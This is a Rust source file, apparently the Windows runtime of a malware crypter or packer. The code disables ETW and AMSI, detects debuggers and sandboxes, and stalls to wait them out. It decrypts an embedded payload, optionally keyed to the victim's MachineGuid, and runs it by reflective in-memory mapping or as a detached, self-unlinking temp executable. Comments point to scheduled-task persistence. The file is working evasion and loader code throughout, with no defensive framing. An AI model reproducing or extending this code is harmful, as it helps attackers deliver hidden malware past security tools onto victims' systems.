//! Windows side: guard → decrypt → execute by the selected strategy.
//!
//! Two strategies, chosen at pack time (`gen::REFLECTIVE`):
//!  - REFLECTIVE: map the PE into this process (no disk). Stealthy, but
//!    TLS-unsound for Rust/tokio payloads — see RESEARCH.md.
//!  - TEMP-EXEC (default): write the decrypted payload to a delete-pending
//!    %TEMP% file and let the OS loader run it. Persistence is external
//!    (`tools/sideload.ps1` scheduled task). TLS/SEH correct.

pub mod anti;
pub mod evasion;
pub mod pe;

use std::os::windows::process::CommandExt;
use std::time::{SystemTime, UNIX_EPOCH};

use windows::Win32::System::Diagnostics::Debug::FlushInstructionCache;
use windows::Win32::System::Threading::GetCurrentProcess;

use crate::gen;

pub fn run() {
    run_payload();
}

pub fn run_payload() {
    unsafe {
        evasion::patch_etw();
        evasion::patch_amsi();
        if anti::detected() {
            return;
        }
        anti::sandbox_delay();

        if gen::BLOB.is_empty() {
            return; // not packed
        }
        let key: [u8; 32] = if gen::BIND {
            match machine_guid() {
                Some(guid) => crypter_common::derive_key(&gen::SECRET, &guid),
                None => return,
            }
        } else {
            gen::KEY
        };
        let pe = match crypter_common::decrypt(gen::BLOB, &key, &gen::NONCE) {
            Ok(p) => p,
            Err(_) => return, // corrupt / wrong key / wrong machine → silent
        };

        if gen::REFLECTIVE {
            if let Ok(entry) = pe::map_into_self(&pe) {
                let _ = FlushInstructionCache(GetCurrentProcess(), None, 0);
                let entry_fn: extern "system" fn() = std::mem::transmute(entry);
                entry_fn();
            }
        } else {
            // Persist the LOADER (not the plaintext payload), then run the
            // payload from a delete-pending temp file with --no-install.
            let _ = exec_temp(&pe);
        }
    }
}

/// Read the target MachineGuid for machine-bound builds.
fn machine_guid() -> Option<String> {
    use windows::core::PCWSTR;
    use windows::Win32::Foundation::ERROR_SUCCESS;
    use windows::Win32::System::Registry::{RegGetValueW, HKEY_LOCAL_MACHINE, RRF_RT_REG_SZ};
    let sub = wide(r"SOFTWARE\Microsoft\Cryptography");
    let name = wide("MachineGuid");
    let mut buf = [0u16; 128];
    let mut size = (buf.len() * 2) as u32;
    let status = unsafe {
        RegGetValueW(
            HKEY_LOCAL_MACHINE,
            PCWSTR(sub.as_ptr()),
            PCWSTR(name.as_ptr()),
            RRF_RT_REG_SZ,
            None,
            Some(buf.as_mut_ptr() as *mut core::ffi::c_void),
            Some(&mut size),
        )
    };
    if status != ERROR_SUCCESS {
        return None;
    }
    let chars = (size as usize / 2).saturating_sub(1);
    Some(String::from_utf16_lossy(&buf[..chars]))
}

fn wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

/// Write the decrypted PE to %TEMP%, start it, then unlink it. The running
/// image keeps the file alive until exit, but the name disappears immediately.
unsafe fn exec_temp(pe: &[u8]) -> Result<(), String> {
    let mut seed = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_nanos() as u64)
        .unwrap_or(0);
    seed ^= std::process::id() as u64;
    seed = seed
        .wrapping_mul(6364136223846793005)
        .wrapping_add(1442695040888963407);

    let path = std::env::temp_dir().join(format!("{seed:016x}.exe"));
    std::fs::write(&path, pe).map_err(|e| format!("write temp: {e}"))?;

    let spawned = std::process::Command::new(&path)
        .arg("--no-install") // no self-copy; persistence is external
        .creation_flags(0x0000_0008) // DETACHED_PROCESS (no console, survives loader exit)
        .spawn();

    // Best-effort unlink: marks delete-pending while the image is mapped.
    let _ = std::fs::remove_file(&path);

    spawned.map(|_| ()).map_err(|e| format!("spawn: {e}"))
}
